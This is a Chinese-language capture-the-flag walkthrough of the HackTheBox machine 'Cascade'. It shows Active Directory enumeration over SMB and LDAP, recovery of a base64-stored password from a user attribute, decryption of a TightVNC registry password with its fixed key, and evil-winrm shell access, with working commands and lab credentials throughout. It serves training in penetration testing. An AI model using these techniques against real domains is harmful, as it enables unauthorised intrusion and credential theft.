---
title: "HTB Cascade"
date: 2024-04-20T00:42:39+08:00
description: HackTheBox Cascade Walkthrough
math: false
tags: [
    "Windows",
    "Active Directory",
    "LDAP",
    "Kerberos",
    "SMB",
    ".NET",
    "Reverse Engineering",
    "TightVNC",
]
categories: [
    "HackTheBox"
]
draft: true
---

[![20240421144458](https://raw.githubusercontent.com/iselt/ImageBed/main/20240421144458.png)](https://app.hackthebox.com/machines/235)

## nmap 枚举

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.182 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.10.182
```

```txt
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-18 09:02:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

389, 636, 3268, 3269 端口是 LDAP 端口，这台主机大概率是一台域控主机。且通过 nmap 默认脚本可知域名为 cascade.local

## 尝试 smb 枚举

优先查看smb匿名登录权限

匿名登录smb，查看共享文件夹（Sharename）

```bash
smbclient -L 10.10.10.182
```

```txt
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

无法获取信息

## LDAP 枚举

<https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap>

```bash
# 简单的LDAP枚举
nmap -p 389 --script ldap-rootdse 10.10.10.182
```

```txt
...
dnsHostName: CASC-DC1.cascade.local
|       ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL
|       serverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
...
```

通过 [`windapsearch`](https://github.com/ropnop/go-windapsearch) 输出LDAP的所有属性

```bash
# 输出所有用户属性
./windapsearch --dc 10.10.10.182 --full -m users
```

```txt
...
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
cascadeLegacyPwd: clk0bjVldmE=
...
```

用户描述字段中似乎没有任何密码，因此我们可以开始检查其他用户属性。用户 r.thompson 的一个属性叫做 cascadeLegacyPwd ，其中包含一个 Base64 编码字符串。解码之后使用 kerbrute 测试，发现就是他的密码。

```bash
kerbrute passwordspray --dc 10.10.10.182 -d cascade.local r.thompson rY4n5eva
```

## 利用 r.thompson 的账户凭证

- 尝试powershell remoting，但是失败

```bash
evil-winrm -i 10.10.10.182 -u r.thompson -p rY4n5eva
```

- 登录 smb

```bash
# 查看共享权限
smbmap -H 10.10.10.182 -u r.thompson -p 'rY4n5eva'
```

```txt
[+] IP: 10.10.10.182:445   Status: Authenticated
        Disk               Permissions     Comment
        ----               -----------     -------
        ADMIN$             NO ACCESS       Remote Admin
        Audit$             NO ACCESS
        C$                 NO ACCESS       Default share
        Data               READ ONLY
        IPC$               NO ACCESS       Remote IPC
        NETLOGON           READ ONLY       Logon server share
        print$             READ ONLY       Printer Drivers
        SYSVOL             READ ONLY       Logon server share
```

```bash
# 登录
smbclient \\\\10.10.10.182\\Data -U r.thompson
```

```txt
smb: \IT\Email Archives\> get Meeting_Notes_June_2018.html
```

查看下载的html文件

```bash
cat Meeting_Notes_June_2018.html
```

```html
...
We will be using a temporary account to perform all tasks related to the network
migration and this account will be deleted at the end of 2018 once the migration
is complete. This will allow us to identify actions related to the migration in
security logs etc. Username is TempAdmin (password is the same as the normal
admin account password).
...
```

获得信息：TempAdmin账户的密码与默认管理员账户的密码相同

下载其他敏感文件

```txt
smb: \IT\Logs\Ark AD Recycle Bin\> get ArkAdRecycleBin.log
smb: \IT\Logs\DCs\> get dcdiag.log
```

ArkAdRecycleBin.log 包含了一个名为 ARK AD RECYCLE BIN MANAGER 的程序的文本日志。

```bash
cat ArkAdRecycleBin.log
```

```txt
1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```

日志告诉我们程序正在 ArkSvc 的上下文中运行，并且 TempAdmin 账户已被移动到回收站。

最后，Temp 包含了用户 r.thompson 和 s.smith 的文件夹。在 s.smith 的文件夹中可以找到 VNC Install.reg 文件。这似乎是 TightVNC 的注册表设置备份，一个桌面远程控制程序。

```txt
smb: \IT\Temp\s.smith\> get "VNC Install.reg"
```

```bash
cat "VNC Install.reg"
```

```txt
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
...
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
...
```

## TightVNC 注册表密码解密

<https://github.com/frizb/PasswordDecrypts>

```bash
$> msfconsole

msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
 => true
>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
 => "sT333ve2"
```

获得 s.smith 的 TightVNC 密码：sT333ve2

## Get Shell

使用 `windapsearch` 可以 `s.smith` 账户具有远程管理的 `CN`

因此可以使用 `evil-winrm` 登录

```bash
evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
```

在 `C:\Users\s.smith\Desktop` 下找到 `user.txt`
